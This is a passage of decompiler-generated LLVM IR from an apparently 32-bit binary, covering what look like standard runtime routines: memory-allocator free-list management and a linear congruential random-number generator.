  br i1 %v3_10008528, label %dec_label_pc_10008538, label %dec_label_pc_10008530

dec_label_pc_10008530:                            ; preds = %dec_label_pc_10008520
  %v2_10008530 = add i32 %v3_10008520, 4
  %v3_10008530 = inttoptr i32 %v2_10008530 to i32*
  store i32 %v3_10008524, i32* %v3_10008530, align 4
  ret i32 %v2_100084d8

dec_label_pc_10008538:                            ; preds = %dec_label_pc_10008520
  %v1_10008538 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008538 = inttoptr i32 %v1_10008538 to i32*
  store i32 %v3_10008524, i32* %v2_10008538, align 4
  ret i32 %v2_100084d8

dec_label_pc_10008540:                            ; preds = %dec_label_pc_10008500
  %v2_10008540 = sub i32 %v2_100084d8, %v1_100084f4
  %v1_10008548 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008548 = inttoptr i32 %v1_10008548 to i32*
  store i32 %v2_10008540, i32* %v2_10008548, align 4
  ret i32 %v1_100084f4

dec_label_pc_10008550:                            ; preds = %dec_label_pc_100084d8
  %v1_10008550 = add i32 %v0_10008550, 4
  %v2_10008550 = inttoptr i32 %v1_10008550 to i32*
  %v3_10008550 = load i32, i32* %v2_10008550, align 4
  store i32 %v3_10008550, i32* %r11.global-to-local, align 4
  %v3_10008554 = icmp eq i32 %v3_10008550, 0
  br i1 %v3_10008554, label %dec_label_pc_10008554.dec_label_pc_1000855c.loopexit_crit_edge, label %dec_label_pc_100084d8

dec_label_pc_10008554.dec_label_pc_1000855c.loopexit_crit_edge: ; preds = %dec_label_pc_10008550
  br label %dec_label_pc_1000855c

dec_label_pc_1000855c:                            ; preds = %dec_label_pc_100084c8, %dec_label_pc_10008554.dec_label_pc_1000855c.loopexit_crit_edge, %dec_label_pc_100084ec, %dec_label_pc_100084f4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10008550, { 1, 2, 0 }
  uselistorder i32 %v0_10008520, { 1, 0 }
  uselistorder i32 %v1_100084f4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_100084d8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v0_10008550, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000855c, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10008520, { 1, 0 }
  uselistorder label %dec_label_pc_100084d8, { 1, 0 }
}

define i32 @function_10008564(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10008564:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10008564 = icmp eq i32 %arg3, 0
  %v2_10008568 = add i32 %arg2, 4
  %v3_10008568 = inttoptr i32 %v2_10008568 to i32*
  store i32 %arg4, i32* %v3_10008568, align 4
  %v2_1000856c = add i32 %arg2, 8
  %v3_1000856c = inttoptr i32 %v2_1000856c to i32*
  store i32 %arg3, i32* %v3_1000856c, align 4
  br i1 %v3_10008564, label %dec_label_pc_1000857c, label %dec_label_pc_10008574

dec_label_pc_10008574:                            ; preds = %dec_label_pc_10008564
  %v2_10008574 = add i32 %arg3, 4
  %v3_10008574 = inttoptr i32 %v2_10008574 to i32*
  store i32 %arg2, i32* %v3_10008574, align 4
  br label %dec_label_pc_10008580

dec_label_pc_1000857c:                            ; preds = %dec_label_pc_10008564
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10008580

dec_label_pc_10008580:                            ; preds = %dec_label_pc_10008574, %dec_label_pc_1000857c
  %v3_10008580 = icmp eq i32 %arg4, 0
  %v0_10008584 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10008580, i32 %v0_10008584)
  %v2_10008588 = add i32 %arg4, 8
  %v3_10008588 = inttoptr i32 %v2_10008588 to i32*
  store i32 %arg2, i32* %v3_10008588, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10008580, { 1, 0 }
}

define i32 @function_10008590(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10008590:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10008590 = icmp eq i32 %arg3, 0
  br i1 %v3_10008590, label %dec_label_pc_100085a0, label %dec_label_pc_10008598

dec_label_pc_10008598:                            ; preds = %dec_label_pc_10008590
  %v2_10008598 = add i32 %arg3, 4
  %v3_10008598 = inttoptr i32 %v2_10008598 to i32*
  store i32 %arg2, i32* %v3_10008598, align 4
  br label %dec_label_pc_100085a4

dec_label_pc_100085a0:                            ; preds = %dec_label_pc_10008590
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100085a4

dec_label_pc_100085a4:                            ; preds = %dec_label_pc_10008598, %dec_label_pc_100085a0
  %v2_100085a4 = add i32 %arg2, 8
  %v3_100085a4 = inttoptr i32 %v2_100085a4 to i32*
  store i32 %arg3, i32* %v3_100085a4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100085a4, { 1, 0 }
}

define i32 @function_100085ac(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100085ac:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_100085c4 = load i32, i32* %arg1, align 4
  store i32 %v2_100085c4, i32* @r31, align 4
  %v2_100085c8 = add i32 %arg3, %arg2
  store i32 %v2_100085c8, i32* %r3.global-to-local, align 4
  %v3_100085dc7 = icmp eq i32 %v2_100085c4, 0
  %v1_100085e08 = add i32 %v2_100085c4, 12
  %tmp69 = icmp uge i32 %v1_100085e08, %arg2
  %or.cond10 = or i1 %v3_100085dc7, %tmp69
  br i1 %or.cond10, label %dec_label_pc_100085ec, label %dec_label_pc_100085d4

dec_label_pc_100085d4:                            ; preds = %dec_label_pc_100085ac, %dec_label_pc_100085d4
  %v0_1000863411 = phi i32 [ %v3_100085d8, %dec_label_pc_100085d4 ], [ %v2_100085c4, %dec_label_pc_100085ac ]
  store i32 %v0_1000863411, i32* %r11.global-to-local, align 4
  %v1_100085d8 = add i32 %v0_1000863411, 4
  %v2_100085d8 = inttoptr i32 %v1_100085d8 to i32*
  %v3_100085d8 = load i32, i32* %v2_100085d8, align 4
  store i32 %v3_100085d8, i32* @r31, align 4
  %v3_100085dc = icmp eq i32 %v3_100085d8, 0
  %v1_100085e0 = add i32 %v3_100085d8, 12
  %tmp6 = icmp uge i32 %v1_100085e0, %arg2
  %or.cond = or i1 %v3_100085dc, %tmp6
  br i1 %or.cond, label %dec_label_pc_100085ec, label %dec_label_pc_100085d4

dec_label_pc_100085ec:                            ; preds = %dec_label_pc_100085d4, %dec_label_pc_100085ac
  %v0_10008628.lcssa = phi i32 [ 0, %dec_label_pc_100085ac ], [ %v0_1000863411, %dec_label_pc_100085d4 ]
  %v0_10008634.lcssa = phi i32 [ %v2_100085c4, %dec_label_pc_100085ac ], [ %v3_100085d8, %dec_label_pc_100085d4 ]
  %v3_100085dc.lcssa = phi i1 [ %v3_100085dc7, %dec_label_pc_100085ac ], [ %v3_100085dc, %dec_label_pc_100085d4 ]
  br i1 %v3_100085dc.lcssa, label %dec_label_pc_100086a4, label %dec_label_pc_100085f4

dec_label_pc_100085f4:                            ; preds = %dec_label_pc_100085ec
  %v1_100085f4 = inttoptr i32 %v0_10008634.lcssa to i32*
  %v2_100085f4 = load i32, i32* %v1_100085f4, align 4
  %v2_100085f8 = sub i32 %v0_10008634.lcssa, %v2_100085f4
  %v1_100085fc = add i32 %v2_100085f8, 12
  %v3_10008600 = icmp ugt i32 %v1_100085fc, %v2_100085c8
  br i1 %v3_10008600, label %dec_label_pc_100086a4, label %dec_label_pc_10008608

dec_label_pc_10008608:                            ; preds = %dec_label_pc_100085f4
  %v4_10008600 = icmp eq i32 %v1_100085fc, %v2_100085c8
  %v2_1000860c = add i32 %v2_100085f4, %arg3
  store i32 %v2_1000860c, i32* @r29, align 4
  br i1 %v4_10008600, label %dec_label_pc_10008614, label %dec_label_pc_10008644

dec_label_pc_10008614:                            ; preds = %dec_label_pc_10008608
  %v3_10008614 = icmp eq i32 %v0_10008628.lcssa, 0
  br i1 %v3_10008614, label %dec_label_pc_10008698, label %dec_label_pc_1000861c

dec_label_pc_1000861c:                            ; preds = %dec_label_pc_10008614
  %v1_1000861c = add i32 %v0_10008628.lcssa, 12
  %v4_10008620 = icmp eq i32 %v1_1000861c, %arg2
  br i1 %v4_10008620, label %dec_label_pc_10008628, label %dec_label_pc_10008698

dec_label_pc_10008628:                            ; preds = %dec_label_pc_1000861c
  %v1_10008628 = inttoptr i32 %v0_10008628.lcssa to i32*
  %v2_10008628 = load i32, i32* %v1_10008628, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_10008630 = add i32 %v0_10008628.lcssa, 8
  %v2_10008630 = inttoptr i32 %v1_10008630 to i32*
  %v3_10008630 = load i32, i32* %v2_10008630, align 4
  %v2_10008638 = add i32 %v2_10008628, %v2_1000860c
  store i32 %v2_10008638, i32* @r29, align 4
  %v5_1000863c = call i32 @function_10008590(i32* %arg1, i32 %v0_10008634.lcssa, i32 %v3_10008630, i32 %v2_100085c8)
  store i32 %v5_1000863c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008698

dec_label_pc_10008644:                            ; preds = %dec_label_pc_10008608
  %v1_10008644 = add i32 %v0_10008634.lcssa, 4
  %v2_10008644 = inttoptr i32 %v1_10008644 to i32*
  %v3_10008644 = load i32, i32* %v2_10008644, align 4
  %v3_10008648 = icmp eq i32 %v3_10008644, 0
  br i1 %v3_10008648, label %dec_label_pc_10008680, label %dec_label_pc_10008650

dec_label_pc_10008650:                            ; preds = %dec_label_pc_10008644
  %v1_10008650 = inttoptr i32 %v3_10008644 to i32*
  %v2_10008650 = load i32, i32* %v1_10008650, align 4
  %v2_10008654 = sub i32 %v3_10008644, %v2_10008650
  %v1_10008658 = add i32 %v2_10008654, 12
  %v4_1000865c = icmp eq i32 %v2_100085c8, %v1_10008658
  br i1 %v4_1000865c, label %dec_label_pc_10008664, label %dec_label_pc_10008680

dec_label_pc_10008664:                            ; preds = %dec_label_pc_10008650
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10008670 = add i32 %v2_10008650, %v2_1000860c
  store i32 %v2_10008670, i32* @r29, align 4
  store i32 %v3_10008644, i32* @r31, align 4
  %v5_10008678 = call i32 @function_10008590(i32* %arg1, i32 %v3_10008644, i32 %v0_10008628.lcssa, i32 %v2_100085c8)
  store i32 %v5_10008678, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008698

dec_label_pc_10008680:                            ; preds = %dec_label_pc_10008650, %dec_label_pc_10008644
  %v2_10008680 = add i32 %v0_10008634.lcssa, %arg3
  store i32 %v2_10008680, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268469912, i32* @lr, align 4
  %v5_10008694 = call i32 @function_10008564(i32* %arg1, i32 %v2_10008680, i32 %v0_10008628.lcssa, i32 %v3_10008644)
  store i32 %v5_10008694, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008698

dec_label_pc_10008698:                            ; preds = %dec_label_pc_1000861c, %dec_label_pc_10008614, %dec_label_pc_10008664, %dec_label_pc_10008628, %dec_label_pc_10008680
  %v0_10008698 = load i32, i32* @r31, align 4
  store i32 %v0_10008698, i32* @r30, align 4
  %v0_1000869c = load i32, i32* @r29, align 4
  %v2_1000869c = inttoptr i32 %v0_10008698 to i32*
  store i32 %v0_1000869c, i32* %v2_1000869c, align 4
  br label %dec_label_pc_100086c0

dec_label_pc_100086a4:                            ; preds = %dec_label_pc_100085f4, %dec_label_pc_100085ec
  %v2_100086a4 = add i32 %v2_100085c8, -12
  %v3_100086a4 = inttoptr i32 %v2_100086a4 to i32*
  store i32 %arg3, i32* %v3_100086a4, align 4
  %v0_100086a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100086a8 = add i32 %v0_100086a8, -12
  store i32 %v1_100086a8, i32* @r30, align 4
  %v0_100086ac = load i32, i32* %r11.global-to-local, align 4
  %v0_100086b0 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100086b0, i32* %r3.global-to-local, align 4
  %v0_100086b4 = load i32, i32* @r31, align 4
  store i32 268469952, i32* @lr, align 4
  %v4_100086bc = inttoptr i32 %v0_100086b0 to i32*
  %v5_100086bc = call i32 @function_10008564(i32* %v4_100086bc, i32 %v1_100086a8, i32 %v0_100086ac, i32 %v0_100086b4)
  store i32 %v5_100086bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100086c0

dec_label_pc_100086c0:                            ; preds = %dec_label_pc_10008698, %dec_label_pc_100086a4
  %v0_100086c4 = load i32, i32* @r30, align 4
  store i32 %v0_100086c4, i32* %r3.global-to-local, align 4
  ret i32 %v0_100086c4

; uselistorder directives
  uselistorder i32 %v3_10008644, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_100085fc, { 1, 0 }
  uselistorder i32 %v0_10008634.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_10008628.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_100085d8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_100085c8, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 10, 1, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_100086c0, { 1, 0 }
  uselistorder label %dec_label_pc_10008698, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_100085d4, { 1, 0 }
}

define i32 @function_100086d8() local_unnamed_addr {
dec_label_pc_100086d8:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_100086f0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_10010310.276 to i32), i32* @r29, align 4
  store i32 %v2_100086f0, i32* @r3, align 4
  %v0_10008708 = call i32 @function_10009200()
  %v0_10008710 = call i32 @function_100091f8()
  %v2_10008718 = ptrtoint i32* %stack_var_-56 to i32
  %v3_10008720 = call i32 @function_100089b4(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 808) to i32*), i32 %v2_10008718)
  store i32 %v2_100086f0, i32* @r3, align 4
  %v0_1000872c = call i32 @function_10009200()
  %v3_10008734 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_10008734
}

define i32 @function_10008748(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008748:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10010310.276 to i32), i32* %r29.global-to-local, align 4
  %v2_1000876c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000876c, i32* @r3, align 4
  %v0_10008774 = call i32 @function_10009200()
  %v0_1000877c = call i32 @function_100091f8()
  store i32 268470168, i32* @lr, align 4
  %v3_10008794 = call i32 @function_100088c0(i32 %arg1, i32* nonnull @global_var_10010328)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000879c = icmp slt i32 %v3_10008794, 0
  store i32 %v2_1000876c, i32* @r3, align 4
  br i1 %v1_1000879c, label %dec_label_pc_100087b0, label %dec_label_pc_100087ac

dec_label_pc_100087ac:                            ; preds = %dec_label_pc_10008748
  store i32 ptrtoint (i32** @global_var_1001032c.280 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100087b0

dec_label_pc_100087b0:                            ; preds = %dec_label_pc_10008748, %dec_label_pc_100087ac
  %v0_100087b0 = call i32 @function_10009200()
  %v0_100087b8 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_100087b8

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100087b0, { 1, 0 }
}

define i32 @function_100087cc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100087cc:
  %stack_var_-56 = alloca i32, align 4
  %v2_100087dc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100087dc, i32* @r3, align 4
  %v0_10008804 = call i32 @function_10009200()
  %v0_1000880c = call i32 @function_100091f8()
  store i32 %arg1, i32* @r3, align 4
  store i32 268470316, i32* @lr, align 4
  %v4_10008828 = inttoptr i32 %arg1 to i32*
  %v5_10008828 = call i32 @function_10008b28(i32* %v4_10008828, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_10010328 to i32))
  store i32 %v2_100087dc, i32* @r3, align 4
  %v0_10008834 = call i32 @function_10009200()
  ret i32 ptrtoint (i32** @global_var_1001032c.280 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_10008854(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008854:
  %stack_var_-40 = alloca i32, align 4
  %v2_10008868 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10008868, i32* @r3, align 4
  %v0_10008884 = call i32 @function_10009200()
  %v0_1000888c = call i32 @function_100091f8()
  store i32 ptrtoint (i32* @global_var_10010328 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268470432, i32* @lr, align 4
  %v0_1000889c = call i32 @function_10008a44()
  store i32 %v2_10008868, i32* @r3, align 4
  %v0_100088a8 = call i32 @function_10009200()
  ret i32 %v0_100088a8

; uselistorder directives
  uselistorder i32* @global_var_10010328, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10010328 to i32), { 1, 0 }
}

define i32 @function_100088c0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100088c0:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_100088c0 = add i32 %tmp, 12
  %v2_100088c0 = inttoptr i32 %v1_100088c0 to i32*
  %v3_100088c0 = load i32, i32* %v2_100088c0, align 4
  store i32 %v3_100088c0, i32* %r11.global-to-local, align 4
  %v0_100088c4 = load i32, i32* @lr, align 4
  store i32 %v0_100088c4, i32* %r0.global-to-local, align 4
  %v1_100088cc = add i32 %arg1, 4
  store i32 %v1_100088cc, i32* %r3.global-to-local, align 4
  %v3_100088d0 = icmp eq i32 %v3_100088c0, 0
  %v1_100088d4 = add i32 %tmp, 8
  %v2_100088d4 = inttoptr i32 %v1_100088d4 to i32*
  %v3_100088d4 = load i32, i32* %v2_100088d4, align 4
  store i32 %v3_100088d4, i32* %r9.global-to-local, align 4
  br i1 %v3_100088d0, label %dec_label_pc_100088e0, label %dec_label_pc_100088e8

dec_label_pc_100088e0:                            ; preds = %dec_label_pc_100088c0
  %v2_100088e0 = add i32 %v3_100088d4, -4
  %v3_100088e0 = inttoptr i32 %v2_100088e0 to i32*
  store i32 0, i32* %v3_100088e0, align 4
  br label %dec_label_pc_10008900

dec_label_pc_100088e8:                            ; preds = %dec_label_pc_100088c0
  %v1_100088e8 = add i32 %tmp, 4
  %v2_100088e8 = inttoptr i32 %v1_100088e8 to i32*
  %v3_100088e8 = load i32, i32* %v2_100088e8, align 4
  %v2_100088ec = sub i32 %v3_100088e8, %v3_100088d4
  %v4_100088f0 = sdiv i32 %v2_100088ec, 4
  %v1_100088f4 = mul i32 %v4_100088f0, 5
  %v2_100088f8 = add i32 %v1_100088f4, %v3_100088c0
  store i32 %v2_100088f8, i32* %r0.global-to-local, align 4
  %v2_100088fc = add i32 %v3_100088d4, -4
  %v3_100088fc = inttoptr i32 %v2_100088fc to i32*
  store i32 %v2_100088f8, i32* %v3_100088fc, align 4
  br label %dec_label_pc_10008900

dec_label_pc_10008900:                            ; preds = %dec_label_pc_100088e0, %dec_label_pc_100088e8
  %v0_10008900 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008900 = add i32 %v0_10008900, -4
  %v2_10008900 = inttoptr i32 %v1_10008900 to i32*
  %v3_10008900 = load i32, i32* %v2_10008900, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f1dc.281 to i32), i32* %r9.global-to-local, align 4
  %v2_10008910 = srem i32 %v3_10008900, 5
  store i32 %v2_10008910, i32* %r11.global-to-local, align 4
  %v2_10008920 = icmp ugt i32 %v2_10008910, 4
  %v1_10008924 = mul nsw i32 %v2_10008910, 4
  store i32 %v1_10008924, i32* %r0.global-to-local, align 4
  %v2_1000892c = add i32 %v1_10008924, ptrtoint (i32* @global_var_1000f1dc.281 to i32)
  store i32 %v2_1000892c, i32* %r10.global-to-local, align 4
  br i1 %v2_10008920, label %dec_label_pc_10008990, label %dec_label_pc_10008934

dec_label_pc_10008934:                            ; preds = %dec_label_pc_10008900
  %v3_10008928 = icmp eq i32 %v2_10008910, 0
  %v1_10008934 = add i32 %v1_10008924, add (i32 ptrtoint (i32* @global_var_1000f1dc.281 to i32), i32 20)
  %v2_10008934 = inttoptr i32 %v1_10008934 to i32*
  %v3_10008934 = load i32, i32* %v2_10008934, align 4
  store i32 %v3_10008934, i32* %r10.global-to-local, align 4
  %v3_10008938 = inttoptr i32 %v2_1000892c to i32*
  %v4_10008938 = load i32, i32* %v3_10008938, align 4
  store i32 %v4_10008938, i32* %r9.global-to-local, align 4
  %v1_1000893c = mul i32 %v3_10008934, 4
  store i32 %v1_1000893c, i32* %r0.global-to-local, align 4
  %v2_10008940 = add i32 %tmp, 16
  %v3_10008940 = inttoptr i32 %v2_10008940 to i32*
  store i32 %v3_10008934, i32* %v3_10008940, align 4
  %v0_10008944 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008944 = add i32 %tmp, 20
  %v3_10008944 = inttoptr i32 %v2_10008944 to i32*
  store i32 %v0_10008944, i32* %v3_10008944, align 4
  %v0_10008948 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008948 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008948 = add i32 %v1_10008948, %v0_10008948
  store i32 %v2_10008948, i32* %r8.global-to-local, align 4
  %v0_1000894c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000894c, i32* %v2_100088c0, align 4
  br i1 %v3_10008928, label %dec_label_pc_10008984, label %dec_label_pc_10008954

dec_label_pc_10008954:                            ; preds = %dec_label_pc_10008934
  %v0_10008954 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008954 = add i32 %v0_10008954, -4
  %v2_10008954 = inttoptr i32 %v1_10008954 to i32*
  %v3_10008954 = load i32, i32* %v2_10008954, align 4
  %v1_10008958 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008958 = sdiv i32 %v3_10008954, %v1_10008958
  %v1_1000895c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000895c = add i32 %v1_1000895c, %v2_10008958
  store i32 %v2_1000895c, i32* %r9.global-to-local, align 4
  %v1_10008960 = mul i32 %v2_10008958, 4
  %v1_10008964 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008964 = sdiv i32 %v2_1000895c, %v1_10008964
  store i32 %v2_10008964, i32* %r11.global-to-local, align 4
  %v2_10008968 = add i32 %v1_10008960, %v0_10008954
  store i32 %v2_10008968, i32* %r0.global-to-local, align 4
  %v2_1000896c = add i32 %tmp, 4
  %v3_1000896c = inttoptr i32 %v2_1000896c to i32*
  store i32 %v2_10008968, i32* %v3_1000896c, align 4
  %v0_10008970 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008970 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008970 = mul i32 %v1_10008970, %v0_10008970
  store i32 %v2_10008970, i32* %r11.global-to-local, align 4
  %v1_10008974 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008974 = sub i32 %v1_10008974, %v2_10008970
  %v1_10008978 = mul i32 %v2_10008974, 4
  %v0_1000897c = load i32, i32* %r3.global-to-local, align 4
  %v2_1000897c = add i32 %v1_10008978, %v0_1000897c
  store i32 %v2_1000897c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000897c, i32* %arg2, align 4
  br label %dec_label_pc_10008984

dec_label_pc_10008984:                            ; preds = %dec_label_pc_10008934, %dec_label_pc_10008954
  %v0_10008984 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008984 = add i32 %tmp, 24
  %v3_10008984 = inttoptr i32 %v2_10008984 to i32*
  store i32 %v0_10008984, i32* %v3_10008984, align 4
  %v0_10008988 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10008988, i32* %v2_100088d4, align 4
  %v0_100089a4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100089a0

dec_label_pc_10008990:                            ; preds = %dec_label_pc_10008900
  %v0_10008990 = call i32 @function_10004e38()
  store i32 %v0_10008990, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10008998 = inttoptr i32 %v0_10008990 to i32*
  store i32 22, i32* %v2_10008998, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100089a0

dec_label_pc_100089a0:                            ; preds = %dec_label_pc_10008984, %dec_label_pc_10008990
  %v0_100089a4 = phi i32 [ %v0_100089a4.pre, %dec_label_pc_10008984 ], [ -1, %dec_label_pc_10008990 ]
  store i32 %v0_100088c4, i32* %r0.global-to-local, align 4
  store i32 %v0_100089a4, i32* %r3.global-to-local, align 4
  ret i32 %v0_100089a4

; uselistorder directives
  uselistorder i32 %v0_100089a4, { 1, 0 }
  uselistorder i32 %v3_10008934, { 1, 0, 2 }
  uselistorder i32 %v1_10008924, { 2, 1, 0 }
  uselistorder i32 %v2_10008910, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 4, 0, 2, 5, 1, 3, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_100089a0, { 1, 0 }
  uselistorder label %dec_label_pc_10008984, { 1, 0 }
  uselistorder label %dec_label_pc_10008900, { 1, 0 }
}

define i32 @function_100089b4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100089b4:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_100089b4 = add i32 %tmp, 12
  %v2_100089b4 = inttoptr i32 %v1_100089b4 to i32*
  %v3_100089b4 = load i32, i32* %v2_100089b4, align 4
  %v1_100089c0 = add i32 %tmp, 8
  %v2_100089c0 = inttoptr i32 %v1_100089c0 to i32*
  %v3_100089c0 = load i32, i32* %v2_100089c0, align 4
  store i32 %v3_100089c0, i32* %r7.global-to-local, align 4
  %v3_100089c4 = icmp eq i32 %v3_100089b4, 0
  br i1 %v3_100089c4, label %dec_label_pc_100089cc, label %dec_label_pc_100089e8

dec_label_pc_100089cc:                            ; preds = %dec_label_pc_100089b4
  %v1_100089cc = inttoptr i32 %v3_100089c0 to i32*
  %v2_100089cc = load i32, i32* %v1_100089cc, align 4
  %v2_100089d0 = mul i32 %v2_100089cc, 1103515245
  %v1_100089d4 = add i32 %v2_100089d0, 12345
  %v1_100089d8 = urem i32 %v1_100089d4, -2147483648
  store i32 %v1_100089d8, i32* %r9.global-to-local, align 4
  store i32 %v1_100089d8, i32* %v1_100089cc, align 4
  %v0_100089e0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100089e0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_100089e0, i32* %v2_100089e0, align 4
  br label %dec_label_pc_10008a3c

dec_label_pc_100089e8:                            ; preds = %dec_label_pc_100089b4
  %v2_100089e8 = load i32, i32* %arg1, align 4
  %v1_100089ec = add i32 %tmp, 4
  %v2_100089ec = inttoptr i32 %v1_100089ec to i32*
  %v3_100089ec = load i32, i32* %v2_100089ec, align 4
  store i32 %v3_100089ec, i32* %r9.global-to-local, align 4
  %v1_100089f0 = add i32 %tmp, 24
  %v2_100089f0 = inttoptr i32 %v1_100089f0 to i32*
  %v3_100089f0 = load i32, i32* %v2_100089f0, align 4
  %v1_100089f4 = add i32 %v2_100089e8, 4
  store i32 %v1_100089f4, i32* %r8.global-to-local, align 4
  %v1_100089f8 = add i32 %v3_100089ec, 4
  %v1_100089fc = inttoptr i32 %v3_100089ec to i32*
  %v2_100089fc = load i32, i32* %v1_100089fc, align 4
  store i32 %v2_100089fc, i32* %r9.global-to-local, align 4
  %v2_10008a00 = icmp ult i32 %v1_100089f4, %v3_100089f0
  %v1_10008a08 = inttoptr i32 %v2_100089e8 to i32*
  %v2_10008a08 = load i32, i32* %v1_10008a08, align 4
